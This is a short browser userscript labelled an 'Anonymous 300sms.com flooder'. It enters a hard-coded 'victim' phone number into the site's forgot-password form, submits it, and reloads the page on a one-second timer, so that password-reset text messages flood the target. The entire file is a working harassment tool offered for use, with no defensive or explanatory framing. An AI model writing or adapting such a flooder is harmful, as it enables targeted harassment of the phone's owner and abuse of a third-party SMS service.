 // ==UserScript==
 // @name          Anonymous 300sms.com flooder
 // @namespace     SUNNY020
 // @description   flooder sms
 // @include       http://*300sms.com/*
 // @credits       One
 // ==/UserScript==
 
 var victim=8092262928 //
 var delay=1000; // Enter delay in milliseconds if required
 
if(document.location=="http://www.300sms.com/forgot_password.php"||document.location=="http://www.300sms.com/forgot_password.php")
 {
 document.getElementById('textfield3').value=victim;
 document.getElementById('button').click();
 }
if(document.location=="http://www.300sms.com/forgot_password.php"||document.location=="http://www.300sms.com/forgot_password.php")
setTimeout("document.location='http://www.300sms.com/forgot_password.php'",delay);